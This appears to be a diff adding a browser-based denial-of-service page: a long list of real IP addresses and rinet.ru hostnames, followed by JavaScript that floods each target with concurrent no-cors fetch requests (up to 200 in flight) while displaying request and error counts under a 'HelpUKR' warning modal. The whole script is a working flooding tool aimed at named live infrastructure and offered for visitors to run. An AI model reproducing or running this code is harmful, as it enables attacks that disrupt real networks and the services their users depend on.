+		    'https://195.91.200.18',
+		    'https://86.62.114.114',
+		    'https://86.62.95.17',
+		    'https://195.54.214.81',
+		    'https://195.91.166.90',
+		    'https://195.91.187.72',
+		    'https://195.91.211.29',
+		    'https://195.91.190.62',
+		    'https://86.62.97.75',
+		    'https://86.62.73.3',
+		    'https://195.91.137.26',
+		    'https://86.62.87.231',
+		    'https://195.54.207.79',
+		    'https://195.91.175.69',
+		    'https://195.91.136.186',
+		    'https://action.rinet.ru',
+		    'https://195.91.174.106',
+		    'https://86.62.120.235',
+		    'https://195.91.167.252',
+		    'https://195.91.182.138',
+		    'https://195.91.200.242',
+		    'https://195.91.180.20',
+		    'https://86.62.97.78',
+		    'https://195.91.176.111',
+		    'https://86.62.84.57',
+		    'https://195.91.138.146',
+		    'https://195.91.148.198',
+		    'https://86.62.86.76',
+		    'https://195.91.138.5',
+		    'https://195.91.191.125',
+		    'https://195.91.211.87',
+		    'https://195.91.145.53',
+		    'https://195.91.162.219',
+		    'https://195.91.187.23',
+		    'https://86.62.117.106',
+		    'https://195.91.148.250',
+		    'https://86.62.67.154',
+		    'https://86.62.108.172',
+		    'https://86.62.65.163',
+		    'https://195.91.144.86',
+		    'https://195.91.187.93',
+		    'https://195.91.136.74',
+		    'https://195.91.133.35',
+		    'https://195.91.191.186',
+		    'https://195.91.191.46',
+		    'https://195.91.168.134',
+		    'https://195.91.210.98',
+		    'https://195.54.210.213',
+		    'https://86.62.88.195',
+		    'https://195.91.185.220',
+		    'https://86.62.121.220',
+		    'https://195.54.207.75',
+		    'https://195.91.210.221',
+		    'https://195.54.206.53',
+		    'https://86.62.102.51',
+		    'https://86.62.84.61',
+		    'https://195.91.191.134',
+		    'https://195.91.144.66',
+		    'https://86.62.91.115',
+		    'https://86.62.116.26',
+		    'https://195.91.173.244',
+		    'https://195.91.182.134',
+		    'https://195.91.145.161',
+		    'https://195.91.142.2',
+		    'https://86.62.123.174',
+		    'https://195.91.207.123',
+		    'https://195.91.186.135',
+		    'https://195.54.192.109',
+		    'https://86.62.69.59',
+		    'https://195.91.160.146',
+		    'https://195.91.149.210',
+		    'https://195.91.138.104',
+		    'https://86.62.114.135',
+		    'https://195.91.182.139',
+		    'https://195.91.205.215',
+		    'https://195.91.145.79',
+		    'https://195.91.161.51',
+		    'https://l.rinet.ru',
+		    'https://86.62.84.227',
+		    'https://195.54.211.62',
+		    'https://195.91.218.18',
+		    'https://195.91.211.43',
+		    'https://195.91.148.72',
+		    'https://195.91.171.183',
+		    'https://195.91.197.2',
+		    'https://stats.rinet.ru',
+		    'https://86.62.73.171',
+		    'https://195.91.157.68',
+		    'https://86.62.74.226',
+		    'https://86.62.118.35',
+		    'https://86.62.93.213',
+		    'https://195.91.187.56',
+		    'https://195.91.185.84',
+		    'https://86.62.66.30',
+		    'https://195.91.155.97',
+		    'https://195.91.180.11',
+		    'https://86.62.66.78',
+		    'https://195.91.159.212',
+		    'https://195.91.159.167',
+		    'https://195.91.159.52',
+		    'https://86.62.127.196',
+		    'https://86.62.84.6',
+		    'https://195.91.136.5',
+		    'https://195.91.160.100',
+		    'https://195.91.221.251',
+		    'https://86.62.102.213',
+		    'https://195.91.148.196',
+		    'https://195.54.213.50',
+		    'https://86.62.123.164',
+		    'https://195.91.209.212',
+		    'https://195.91.157.60',
+		    'https://86.62.81.174',
+		    'https://dpi2.rinet.ru',
+		    'https://195.91.191.206',
+		    'https://195.91.162.140',
+		    'https://86.62.66.83',
+		    'https://195.91.185.214',
+		    'https://195.91.167.229',
+		    'https://195.91.196.90',
+		    'https://86.62.66.74',
+		    'https://86.62.97.1',
+		    'https://195.91.219.163',
+		    'https://86.62.66.71',
+		    'https://195.54.213.123',
+		    'https://86.62.97.51',
+		    'https://195.91.137.139',
+		    'https://80.90.243.47',
+		    'https://sender.rinet.ru',
+		    'https://195.54.207.113',
+		    'https://195.91.184.162',
+		    'https://195.91.156.134',
+		    'https://195.91.159.211',
+		    'https://195.54.209.136',
+		    'https://86.62.88.84',
+		    'https://86.62.66.77',
+		    'https://195.54.214.225',
+		    'https://86.62.115.134',
+		    'https://195.91.176.116',
+		    'https://86.62.112.187',
+		    'https://86.62.68.197',
+		    'https://195.91.138.141',
+		    'https://86.62.117.50',
+		    'https://86.62.86.89',
+		    'https://195.91.187.9',
+		    'https://195.54.214.56',
+		    'https://86.62.72.114',
+		    'https://86.62.121.219',
+		    'https://195.91.137.50',
+		    'https://195.91.156.68',
+		    'https://86.62.110.136',
+		    'https://195.91.149.122',
+		    'https://195.91.145.74',
+		    'https://195.54.192.26',
+		    'https://195.91.156.215',
+		    'https://195.91.144.245',
+		    'https://195.54.207.110',
+		    'https://86.62.75.107',
+		    'https://shvernik.rinet.ru',
+		    'https://195.91.131.90',
+		    'https://86.62.119.163',
+		    'https://86.62.122.226',
+		    'https://195.91.184.38',
+		    'https://195.91.156.106',
+		    'https://195.91.184.147',
+		    'https://195.91.201.189',
+		    'https://86.62.81.18',
+		    'https://195.91.145.52',
+		    'https://195.91.182.114',
+		    'https://86.62.121.28',
+		    'https://195.91.164.186',
+		    'https://86.62.89.77',
+		    'https://195.91.213.134',
+		    'https://195.91.179.91',
+		    'https://86.62.94.45',
+		    'https://195.91.180.62',
+		    'https://195.91.162.26',
+		    'https://195.91.135.188',
+		    'https://86.62.115.201',
+		    'https://195.91.143.42',
+		    'https://195.54.205.116',
+		    'https://86.62.121.236',
+		    'https://195.91.180.50',
+		    'https://tracker.rinet.ru',
+		    'https://195.91.198.2',
+		    'https://195.54.213.121',
+		    'https://195.91.200.78',
+		    'https://195.54.213.30',
+		    'https://195.91.221.54',
+		    'https://86.62.119.132',
+		    'https://195.91.130.2',
+		    'https://195.91.186.142',
+		    'https://195.91.145.80',
+		    'https://195.91.221.29',
+		    'https://195.91.135.2',
+		    'https://195.91.170.42',
+		    'https://195.91.152.4',
+		    'https://195.54.215.71',
+		    'https://86.62.122.141',
+		    'https://195.91.186.185',
+		    'https://195.54.207.94',
+		    'https://195.91.132.68',
+		    'https://195.91.132.19',
+		    'https://195.91.144.40',
+		    'https://86.62.115.133',
+		    'https://86.62.83.211',
+		    'https://195.91.153.103',
+		    'https://86.62.84.244',
+		    'https://80.90.240.63',
+		    'https://86.62.88.59',
+		    'https://86.62.87.230',
+		    'https://86.62.74.164',
+		    'https://80.90.243.30',
+		    'https://195.91.138.197',
+		    'https://195.91.198.215',
+		    'https://195.91.134.202',
+		    'https://195.91.139.206',
+		    'https://195.91.128.229',
+		    'https://86.62.117.245',
+		    'https://195.91.206.114',
+		    'https://86.62.92.5',
+		    'https://195.91.181.15',
+		    'https://86.62.96.179',
+		    'https://gitlab.rinet.ru',
+		    'https://86.62.90.58',
+		    'https://195.54.206.6',
+		    'https://195.91.148.82',
+		    'https://195.91.155.102',
+		    'https://195.91.183.166',
+		    'https://195.91.144.64',
+		    'https://86.62.123.163',
+		    'https://195.91.196.29',
+		    'https://195.91.163.205',
+		    'https://86.62.76.84',
+		    'https://195.91.163.108',
+		    'https://woozle.rinet.ru',
+		    'https://195.54.213.65',
+		    'https://86.62.79.229',
+		    'https://ant.rinet.ru',
+		    'https://80.90.240.74',
+		    'https://86.62.102.1',
+		    'https://195.91.152.3',
+		    'https://195.54.201.42',
+		    'https://86.62.68.162',
+		    'https://195.91.201.242',
+		    'https://195.91.201.180',
+		    'https://86.62.119.219',
+		    'https://86.62.123.118',
+		    'https://195.91.191.4',
+		    'https://86.62.96.242',
+		    'https://195.91.201.139',
+		    'https://86.62.76.149',
+		    'https://195.91.162.76',
+		    'https://86.62.65.166',
+		    'https://195.91.133.122',
+		    'https://86.62.97.50',
+		    'https://86.62.84.153',
+		    'https://195.91.148.151',
+		    'https://86.62.95.229',
+		    'https://195.91.180.195',
+		    'https://86.62.78.166',
+		    'https://195.91.187.37',
+		    'https://86.62.95.231',
+		    'https://195.91.139.154',
+		    'https://195.91.198.213',
+		    'https://86.62.89.204',
+		    'https://195.91.134.67',
+		    'https://86.62.115.68',
+		    'https://86.62.89.198',
+		    'https://80.90.243.39',
+		    'https://195.91.181.138',
+		    'https://195.91.138.13',
+		    'https://195.91.139.146',
+		    'https://195.54.214.12',
+		    'https://195.54.214.240',
+		    'https://195.91.179.34',
+		    'https://86.62.119.62',
+		    'https://86.62.115.93',
+		    'https://86.62.83.138',
+		    'https://86.62.102.212',
+		    'https://195.54.213.24',
+		    'https://195.91.191.162',
+		    'https://195.91.137.18',
+		    'https://195.91.191.96',
+		    'https://195.91.199.34',
+		    'https://195.91.162.212',
+		    'https://195.54.210.210',
+		    'https://195.54.209.203',
+		    'https://195.91.161.26',
+		    'https://86.62.90.130',
+		    'https://195.91.176.101',
+		    'https://195.91.181.186',
+		    'https://195.91.148.87',
+		    'https://195.91.191.246',
+		    'https://195.91.221.86',
+		    'https://195.91.151.138',
+		    'https://195.91.179.102',
+		    'https://195.91.158.50',
+		    'https://86.62.78.98',
+		    'https://86.62.88.231',
+		    'https://86.62.69.58',
+		    'https://86.62.108.157',
+		    'https://195.91.136.106',
+		    'https://86.62.85.66',
+		    'https://195.91.145.154',
+		    'https://195.91.184.134',
+		    'https://cs0.rinet.ru',
+		    'https://195.91.138.145',
+		    'https://86.62.71.188',
+		    'https://86.62.67.137',
+		    'https://80.90.240.71',
+		    'https://86.62.73.130',
+		    'https://195.91.195.80',
+		    'https://195.91.163.172',
+		    'https://195.91.209.59',
+		    'https://195.91.189.201',
+		    'https://86.62.97.11',
+		    'https://195.91.183.38',
+		    'https://195.91.177.10',
+		    'https://195.91.176.118',
+		    'https://195.91.191.165',
+		    'https://86.62.79.46',
+		    'https://195.91.201.190',
+		    'https://195.91.191.117',
+		    'https://86.62.114.226',
+		    'https://195.91.185.178',
+		    'https://195.91.145.116',
+		    'https://195.91.143.43',
+		    'https://195.91.191.123',
+		    'https://86.62.102.215',
+		    'https://195.91.169.134',
+		    'https://195.91.136.107',
+		    'https://195.54.214.175',
+		    'https://195.91.183.53',
+		    'https://86.62.115.83',
+		    'https://86.62.95.20',
+		    'https://195.91.191.91',
+		    'https://195.91.205.136',
+		    'https://195.91.180.203',
+		    'https://195.91.221.74',
+		    'https://86.62.92.126',
+		    'https://195.91.176.117',
+		    'https://195.91.187.173',
+		    'https://86.62.110.135',
+		    'https://195.91.220.219',
+		    'https://195.54.213.101',
+		    'https://86.62.97.114',
+		    'https://86.62.73.58',
+		    'https://195.54.205.115',
+		    'https://86.62.89.151',
+		    'https://195.91.191.248',
+		    'https://195.54.214.154',
+		    'https://195.91.155.96',
+		    'https://195.91.144.172',
+		    'https://195.91.206.3',
+		    'https://86.62.83.205',
+		    'https://195.91.130.133',
+		    'https://195.91.223.220',
+		    'https://195.91.200.20',
+		    'https://195.91.200.38',
+		    'https://195.91.138.225',
+		    'https://195.91.164.68',
+		    'https://195.91.181.189',
+		    'https://195.91.183.149',
+		    'https://195.91.187.144',
+		    'https://195.91.191.233',
+		    'https://86.62.66.76',
+		    'https://195.54.206.2',
+		    'https://195.91.159.172',
+		    'https://80.90.240.64',
+		    'https://195.91.221.242',
+		    'https://195.91.145.145',
+		    'https://86.62.99.134',
+		    'https://195.91.189.50',
+		    'https://195.54.214.70',
+		    'https://195.91.220.50',
+		    'https://86.62.88.221',
+		    'https://195.91.180.172',
+		    'https://195.91.211.91',
+		    'https://195.54.210.214',
+		    'https://195.91.144.177',
+		    'https://86.62.84.54',
+		    'https://195.54.213.38',
+		    'https://86.62.80.51',
+		    'https://content.rinet.ru',
+		    'https://195.91.186.200',
+		    'https://195.54.195.155',
+		    'https://195.54.213.119',
+		    'https://195.91.155.68',
+		    'https://vpn.off.rinet.ru',
+		    'https://195.91.222.228',
+		    'https://86.62.85.163',
+		    'https://195.91.151.59',
+		    'https://195.91.149.6',
+		    'https://195.91.215.228',
+		    'https://195.91.213.228',
+		    'https://195.54.198.33',
+		    'https://195.91.181.8',
+		    'https://195.91.145.73',
+		    'https://195.91.162.74',
+		    'https://86.62.71.215',
+		    'https://195.91.161.130',
+		    'https://86.62.93.82',
+		    'https://86.62.93.118',
+		    'https://195.91.144.112',
+		    'https://195.54.209.215',
+		    'https://195.91.177.157',
+		    'https://195.91.221.147',
+		    'https://195.54.209.92',
+		    'https://195.91.148.35',
+		    'https://195.91.145.20',
+		    'https://86.62.112.2',
+		    'https://86.62.121.146',
+		    'https://86.62.87.120',
+		    'https://86.62.88.216',
+		    'https://195.91.210.40',
+		    'https://195.91.245.232',
+		    'https://195.91.207.122',
+		    'https://elephant.rinet.ru',
+		    'https://86.62.91.51',
+		    'https://86.62.102.216',
+		    'https://195.91.180.40',
+		    'https://195.91.145.211',
+		    'https://86.62.82.113',
+		    'https://195.91.139.178',
+		    'https://195.91.177.146',
+		    'https://195.54.207.70',
+		    'https://195.91.144.215',
+		    'https://195.54.214.253',
+		    'https://86.62.70.205',
+		    'https://195.91.221.106',
+		    'https://195.91.205.229',
+		    'https://195.91.144.127',
+		    'https://195.91.163.154',
+		    'https://195.54.211.59',
+		    'https://195.91.185.122',
+		    'https://195.54.214.20',
+		    'https://195.91.144.51',
+		    'https://195.91.138.175',
+		    'https://86.62.119.61',
+		    'https://86.62.102.217',
+		    'https://195.91.205.210',
+		    'https://86.62.74.93',
+		    'https://195.91.211.2',
+		    'https://195.91.130.131',
+		    'https://86.62.80.179',
+		    'https://195.91.145.220',
+		    'https://195.91.194.242',
+		    'https://195.91.180.174',
+		    'https://80.90.243.236',
+		    'https://86.62.108.159',
+		    'https://devtools.rinet.ru',
+		    'https://80.90.243.237',
+		    'https://195.91.139.212',
+		    'https://195.91.187.125',
+		    'https://195.91.181.43',
+		    'https://195.91.187.179',
+		    'https://195.54.214.57',
+		    'https://195.54.214.127',
+		    'https://195.91.213.156',
+		    'https://195.91.191.195',
+		    'https://86.62.121.43',
+		    'https://195.91.133.170',
+		    'https://86.62.66.117',
+		    'https://195.54.206.51',
+		    'https://86.62.85.212',
+		    'https://195.91.132.66',
+		    'https://195.54.214.244',
+		    'https://195.54.206.188',
+		    'https://195.91.134.251',
+		    'https://86.62.87.165',
+		    'https://195.91.131.51',
+		    'https://86.62.85.2',
+		    'https://195.91.199.38',
+		    'https://86.62.69.18',
+		    'https://195.54.213.103',
+		    'https://195.91.180.41',
+		    'https://195.91.218.218',
+		    'https://195.91.159.210',
+		    'https://86.62.87.227',
+		    'https://195.91.158.205',
+		    'https://195.91.195.79',
+		    'https://80.90.243.16',
+		    'https://86.62.95.227',
+		    'https://86.62.108.160',
+		    'https://86.62.76.50',
+		    'https://195.54.213.125',
+		    'https://80.90.250.15',
+		    'https://newdove.rinet.ru',
+		    'https://86.62.91.18',
+		    'https://195.54.206.50',
+		    'https://80.90.240.73',
+		    'https://86.62.80.170',
+		    'https://86.62.94.34',
+		    'https://195.91.191.206',
+		    'https://195.54.214.98',
+		    'https://86.62.68.195',
+		    'https://195.91.221.105',
+		    'https://195.54.213.110',
+		    'https://195.91.150.49',
+		    'https://195.91.178.108',
+		    'https://195.54.201.13',
+		    'https://195.91.179.26',
+		    'https://86.62.76.155',
+		    'https://86.62.81.152',
+		    'https://86.62.71.196',
+		    'https://86.62.121.231',
+		    'https://195.91.185.219',
+		    'https://195.54.192.102',
+		    'https://195.91.206.116',
+		    'https://195.91.179.146',
+		    'https://195.91.178.124',
+		    'https://80.90.240.70',
+		    'https://195.91.131.65',
+		    'https://195.91.186.139',
+		    'https://86.62.121.39',
+		    'https://195.91.138.176',
+		    'https://86.62.96.226',
+		    'https://195.91.215.98',
+		    'https://86.62.74.178',
+		    'https://195.54.214.123',
+		    'https://195.91.157.169',
+		    'https://195.91.181.213',
+		    'https://195.91.148.146',
+		    'https://86.62.120.187',
+		    'https://195.91.128.188',
+		    'https://195.91.213.117',
+		    'https://195.91.213.26',
+		    'https://195.91.210.140',
+		    'https://86.62.70.195',
+		    'https://195.91.181.178',
+		    'https://195.91.191.77',
+		    'https://195.91.187.113',
+		    'https://195.91.181.23',
+		    'https://195.91.215.178',
+		    'https://195.91.130.148',
+		    'https://195.91.177.148',
+		    'https://195.91.145.25',
+		    'https://195.91.131.52',
+		    'https://195.91.197.174',
+		    'https://195.91.129.158',
+		    'https://195.91.221.108',
+		    'https://195.91.210.243',
+		    'https://86.62.116.140',
+		    'https://86.62.117.66',
+		    'https://195.54.213.51',
+		    'https://86.62.99.66',
+		    'https://86.62.126.76',
+		    'https://86.62.112.203',
+		    'https://195.91.145.92',
+		    'https://195.91.205.236',
+		    'https://195.91.196.66',
+		    'https://86.62.72.100',
+		    'https://195.91.221.63',
+		    'https://86.62.75.130',
+		    'https://86.62.86.85',
+		    'https://h195-91-221-35.ln.rinet.ru',
+		    'https://195.91.155.180',
+		    'https://195.91.196.195',
+		    'https://195.91.205.214',
+		    'https://195.91.213.146',
+		    'https://86.62.96.98',
+		    'https://86.62.70.149',
+		    'https://195.54.213.211',
+		    'https://195.91.183.22',
+		    'https://195.91.181.133',
+		    'https://195.91.189.200',
+		    'https://195.91.181.185',
+		    'https://80.90.243.55',
+		    'https://195.91.206.34',
+		    'https://195.91.170.131',
+		    'https://195.91.154.212',
+		    'https://195.91.134.155',
+		    'https://195.91.183.24',
+		    'https://195.91.168.243',
+		    'https://195.91.138.173',
+		    'https://195.91.177.83',
+		    'https://195.91.211.214',
+		    'https://195.91.209.106',
+		    'https://195.54.214.110',
+		    'https://195.91.176.99',
+		    'https://195.91.178.4',
+		    'https://195.54.213.70',
+		    'https://195.54.210.211',
+		    'https://195.91.145.36',
+		    'https://195.91.148.20',
+		    'https://86.62.84.75',
+		    'https://86.62.91.19',
+		    'https://86.62.88.35',
+		    'https://86.62.95.67',
+		    'https://86.62.120.236',
+		    'https://86.62.84.60',
+		    'https://86.62.85.146',
+		    'https://195.91.221.9',
+		    'https://86.62.79.42',
+		    'https://86.62.117.146',
+		    'https://195.91.196.113',
+		    'https://86.62.95.233',
+		    'https://195.91.186.130',
+		    'https://86.62.84.210',
+		    'https://195.91.152.2',
+		    'https://195.91.175.3',
+		    'https://195.91.213.74',
+		    'https://195.91.138.142',
+		    'https://195.91.180.9',
+		    'https://195.91.186.66',
+		    'https://86.62.95.153',
+		    'https://86.62.121.170',
+		    'https://195.91.205.238',
+		    'https://86.62.67.136',
+		    'https://195.54.214.76',
+		    'https://195.91.205.230',
+		    'https://86.62.126.77',
+		    'https://195.91.198.203',
+		    'https://195.91.129.118',
+		    'https://86.62.123.100',
+		    'https://195.91.198.217',
+		    'https://195.54.214.13',
+		    'https://195.91.130.52',
+		    'https://195.91.182.70',
+		    'https://195.91.162.194',
+		    'https://195.91.187.118',
+		    'https://195.54.201.99',
+		    'https://195.54.206.48',
+		    'https://86.62.96.165',
+		    'https://195.54.214.170',
+		    'https://86.62.108.130',
+		    'https://195.91.177.149',
+		    'https://86.62.69.83',
+		    'https://86.62.66.29',
+		    'https://86.62.82.250',
+		    'https://195.91.145.178',
+		    'https://rasp.rinet.ru',
+		    'https://195.91.159.65',
+		    'https://195.91.220.34',
+		    'https://195.54.210.13',
+		    'https://195.91.180.212',
+		    'https://195.91.183.146',
+		    'https://195.91.181.103',
+		    'https://195.91.145.17',
+		    'https://195.91.186.114',
+		    'https://195.54.214.131',
+		    'https://195.54.210.7',
+		    'https://195.91.206.182',
+		    'https://195.54.210.212',
+		    'https://86.62.66.196',
+		    'https://86.62.88.3',
+		    'https://195.91.213.226',
+		    'https://195.91.189.18',
+		    'https://195.91.155.106',
+		    'https://80.90.250.12',
+		    'https://86.62.120.62',
+		    'https://86.62.91.146',
+		    'https://195.91.183.58',
+		    'https://195.91.153.71',
+		    'https://80.90.249.8',
+		    'https://d187-090.cl.rinet.ru',
+		    'https://main.rinet.ru',
+		    'https://195.91.155.103',
+		    'https://195.91.150.39',
+		    'https://86.62.83.210',
+		    'https://195.91.141.150',
+		    'https://195.91.153.100',
+		    'https://195.91.132.13',
+		    'https://86.62.83.130',
+		    'https://195.91.189.146',
+		    'https://195.91.132.106',
+		    'https://195.91.209.194',
+		    'https://86.62.76.107',
+		    'https://86.62.102.9',
+		    'https://195.91.187.29',
+		    'https://195.91.167.239',
+		    'https://195.54.213.116',
+		    'https://195.91.211.243',
+		    'https://86.62.115.91',
+		    'https://195.91.154.143',
+		    'https://86.62.67.181',
+		    'https://86.62.70.58',
+		    'https://195.91.148.246',
+		    'https://195.91.182.115',
+		    'https://195.91.143.39',
+		    'https://195.91.152.5',
+		    'https://195.91.180.156',
+		    'https://86.62.70.250',
+		    'https://195.91.191.63',
+		    'https://195.91.160.131',
+		    'https://80.90.254.75',
+		    'https://195.91.132.180',
+		    'https://86.62.92.140',
+		    'https://195.91.211.39',
+		    'https://195.91.219.186',
+		    'https://195.91.177.92',
+		    'https://195.54.214.24',
+		    'https://86.62.91.82',
+		    'https://www.api.rinet.ru',
+		    'https://195.91.151.73',
+		    'https://86.62.122.2',
+		    'https://86.62.119.58',
+		    'https://195.91.133.195',
+		    'https://195.91.180.110',
+		    'https://86.62.97.85',
+		    'https://86.62.93.225',
+		    'https://86.62.114.218',
+		    'https://195.54.213.212',
+		    'https://86.62.89.130',
+		    'https://195.91.223.222',
+		    'https://195.91.181.150',
+		    'https://195.91.129.90',
+		    'https://195.91.153.81',
+		    'https://86.62.68.26',
+		    'https://195.91.189.198',
+		    'https://80.90.250.13',
+		    'https://86.62.72.183',
+		    'https://86.62.120.182',
+		    'https://86.62.95.228',
+		    'https://86.62.84.247',
+		    'https://195.91.138.26',
+		    'https://86.62.90.106',
+		    'https://86.62.87.232',
+		    'https://86.62.74.42',
+		    'https://195.91.184.36',
+		    'https://195.54.214.166',
+		    'https://86.62.92.27',
+		    'https://195.91.159.4',
+		    'https://86.62.114.11',
+		    'https://195.91.176.130',
+		    'https://86.62.66.162',
+		    'https://ggc2.rinet.ru',
+		    'https://195.91.222.83',
+		    'https://195.54.214.26',
+		    'https://195.54.214.25',
+		    'https://86.62.91.42',
+		    'https://195.91.176.98',
+		    'https://86.62.71.200',
+		    'https://195.54.210.14',
+		    'https://86.62.108.139',
+		    'https://195.54.207.74',
+		    'https://195.54.207.80',
+		    'https://195.91.143.41',
+		    'https://195.91.158.238',
+		    'https://195.91.145.47',
+		    'https://86.62.78.67',
+		    'https://195.91.138.206',
+		    'https://intmap.rinet.ru',
+		    'https://195.54.213.67',
+		    'https://86.62.70.114',
+		    'https://86.62.108.211',
+		    'https://86.62.72.22',
+		    'https://86.62.76.83',
+		    'https://195.91.222.197',
+		    'https://86.62.118.178',
+		    'https://86.62.71.21',
+          ];
+          // initialize variables
+          var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+          var statRow = document.querySelector("#stats > .row");
+          var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+          var CONCURRENCY_LIMIT = 200;
+          var queue = [];
+          var attack = false;
+          var totalrequests = 0;
+          var totalerrors = 0;
+          function togglePause () {
+              if (attack) {
+                  attack = false;
+                  document.querySelector("div.desc .btn").innerText = "Resume";
+              } else {
+                  attack = true;
+                  document.querySelector("div.desc .btn").innerText = "Pause";
+                  for (var i=0; i<urls.length; i++) {
+                      flood(i);
+                  }
+              }
+          }
+          async function fetchWithTimeout(resource, options) {
+              const controller = new AbortController();
+              const id = setTimeout(() => controller.abort(), options.timeout);
+              return fetch(resource, {
+                  signal: controller.signal,
+                  mode: 'no-cors'
+              }).then((response) => {
+                  clearTimeout(id);
+                  return response;
+              }).catch((error) => {
+                  clearTimeout(id);
+                  throw error;
+              });
+          }
+          async function sleep(ms) {
+              return new Promise(r => setTimeout(r, ms));
+          }         
+          async function flood(n) {
+              const url = urls[n];
+              const target = targets[url];
+              while (attack) {
+                  if (queue.length > CONCURRENCY_LIMIT) {
+                      await queue.shift();
+                  }
+                  queue.push(
+                      fetchWithTimeout(url, { timeout: 2000 })
+                          .catch((error) => {
+                              if (error.code === 20 /* ABORT */) {
+                                  return;
+                              }
+                              target.number_of_errored_responses++;
+                              target.error_message = error.message;
+                              totalerrors++;
+                          })
+                          .then((response) => {
+                              if (response && !response.ok) {
+                                  target.number_of_errored_responses++;
+                                  target.error_message = response.statusText;
+                                  totalerrors++;
+                              }
+                              target.number_of_requests++;
+                          })
+                          .finally(() => updateTargetDisplay(n))
+                  );
+                  await sleep(1);
+              }
+          }
+          // Update data for target n
+          function updateTargetDisplay(n) {
+              var url = urls[n];
+              var {number_of_requests, number_of_errored_responses} = targets[url];
+              var requests_cell = document.querySelector(`#target${n} .requests`);
+              var errors_cell = document.querySelector(`#target${n} .errors`);
+              requests_cell.innerText = number_of_requests;
+              errors_cell.innerText = number_of_errored_responses;
+              document.querySelector("#totalrequests").innerText = totalrequests;
+              document.querySelector("#totalerrors").innerText = totalerrors;
+          }
+          // Shuffle array order before starting
+          for (let i = urls.length - 1; i > 0; i--) {
+              const j = Math.floor(Math.random() * (i + 1));
+              [urls[i], urls[j]] = [urls[j], urls[i]];
+          }
+          // Create div for each target
+          for (var i=0; i<urls.length; i++) {
+              statRow.innerHTML += `
+                  <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                    <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                      <table class='status'>
+                        <tr><td>requests:</td><td class="requests">0</td></tr>
+                        </tr><td>errors:</td><td class="errors">0</td></tr>
+                      </table>
+                    </div>
+              `;
+          }
+          // Show warning window
+          myModal.toggle();
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-85513613-1');
+  </script>
+  <script>
+  // BETA plugin for estimated requested data
+  (function($) {
+    $.fn.countTo = function(options) {
+      return this.each(function() {
+        //-- Arrange
+        var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+        var $el = $(this);
+        var countFrom = parseInt($el.attr('data-count-from'));
+        var countTo = parseInt($el.attr('data-count-to'));
+        var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+  
+        //-- Action
+        var rafId;
+        var increment;
+        var currentCount = countFrom;
+        var countAction = function() {              // Self looping local function via requestAnimationFrame
+          if(currentCount < countTo) {              // Perform number incremeant
+            $el.text(Math.floor(currentCount));     // Update HTML display
+            increment = countSpeed / FRAME_RATE;    // Calculate increment step
+            currentCount += increment;              // Increment counter
+            rafId = requestAnimationFrame(countAction);
+          } else {                                  // Terminate animation once it reaches the target count number
+            $el.text(countTo);                      // Set to the final value before everything stops
+            //cancelAnimationFrame(rafId);
+          }
+        };
+        rafId = requestAnimationFrame(countAction); // Initiates the looping function
+      });
+    };
+  }(jQuery));
+  
+  //-- Executing
+  $('.number-counter').countTo();
+  </script>
+  </html>
